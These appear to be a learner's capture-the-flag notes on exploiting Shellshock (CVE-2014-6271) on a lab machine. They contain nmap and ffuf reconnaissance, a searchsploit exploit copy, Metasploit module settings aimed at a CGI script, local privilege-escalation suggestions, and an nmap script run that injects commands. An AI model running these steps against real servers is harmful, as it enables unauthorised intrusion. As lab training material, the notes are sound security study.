# Nmap

```bash
> nmap -Pn -p- --min-rate 4000 10.10.10.56
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-06 11:34 +0700
Nmap scan report for 10.10.10.56
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
80/tcp    open     http
2222/tcp  open     EtherNetIP-1
64058/tcp filtered unknown
```

```bash
> nmap -Pn -p80,2222 -sCV 10.10.10.56
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-06 11:34 +0700
Nmap scan report for 10.10.10.56
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn\'t have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Web Fuzzing

```bash
> ffuf -u 'http://10.10.10.56/FUZZ' -w ~/seclists/Discovery/Web-Content/common.txt -ic -c
```
![[Pasted image 20250906125549.png]]

```bash
]$ ffuf -u http://10.10.10.56/cgi-bin/FUZZ -w ~/seclists/Discovery/Web-Content/common.txt -ic -c -t 250 -v -e .py,.pl,.sh,.cgi -mc 200
```
![[Pasted image 20250913111957.png]]

# CVE-2014-6271 

https://github.com/b4keSn4ke/CVE-2014-6271

This exploit will only work on web servers having a version of Bash < 4.3.  
In some cases, if you are able to get a HTTP 200 code on your web browser  
by doing a GET request to the `/cgi-bin/`, you could just try to run the exploit against that directory.  

Otherwise if you have a 403 on the `/cgi-bin/` directory, try to enumerates for files  
within that directory with a good wordlist, searching for `.sh` or `.cgi` extensions.

```bash
$ searchsploit -m 34900
  Exploit: Apache mod_cgi - 'Shellshock' Remote Command Injection
      URL: https://www.exploit-db.com/exploits/34900
     Path: /usr/share/exploitdb/exploits/linux/remote/34900.py
    Codes: CVE-2014-6278, CVE-2014-6271
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /tmp/tmp.8aGGEDtCzs/34900.py


[akhmadm@cachyos-x8664 tmp.8aGGEDtCzs]$ ls
34900.py  cgi.py
```

# Metasploit

```bash
Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting   Required  Description
   ----            ---------------   --------  -----------
   CMD_MAX_LENGTH  2048              yes       CMD max line length
   CVE             CVE-2014-6271     yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent        yes       HTTP header to use
   METHOD          GET               yes       HTTP method to use
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks
                                               5h
   RHOSTS          10.10.10.56       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPATH           /bin              yes       Target PATH for binaries used by the CmdStager
   RPORT           80                yes       The target port (TCP)
   SSL             false             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                           no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /cgi-bin/user.sh  yes       Path to CGI script
   TIMEOUT         5                 yes       HTTP read response timeout (seconds)
   URIPATH                           no        The URI to use for this exploit (default is random)
   VHOST                             no        HTTP server virtual host
```

```bash
 #   Name                                                               Potentially Vulnerable?  Check Result
 -   ----                                                               -----------------------  ------------
 1   exploit/linux/local/bpf_sign_extension_priv_esc                    Yes                      The target appears to be vulnerable.
 2   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                Yes                      The target is vulnerable.
 3   exploit/linux/local/docker_cgroup_escape                           Yes                      The target is vulnerable. IF host OS is Ubuntu, kernel version 4.4.0-96-generic is vulnerable
 4   exploit/linux/local/glibc_realpath_priv_esc                        Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.
 6   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
```
---
# ippsec walkthrough

1. It's recommended to include status code `403` when dirbusting, because sometimes we can get files/pages inside that directory

```bash
$ locate nse | grep shellshock
/usr/share/nmap/scripts/http-shellshock.nse

$ less /usr/share/nmap/scripts/http-shellshock.nse

```

```bash
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
```

## nmap script http-shellshock

```bash
$ nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-19 11:30 +0700
Nmap scan report for 10.10.10.56
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|
|     Disclosure date: 2014-09-24
|     Exploit results:
|       <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|   <html><head>
|   <title>500 Internal Server Error</title>
|   </head><body>
|   <h1>Internal Server Error</h1>
|   <p>The server encountered an internal error or
|   misconfiguration and was unable to complete
|   your request.</p>
|   <p>Please contact the server administrator at
|    webmaster@localhost to inform them of the time this error occurred,
|    and the actions you performed just before this error.</p>
|   <p>More information about this error may be available
|   in the server error log.</p>
|   <hr>
|   <address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
|   </body></html>
|
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
```
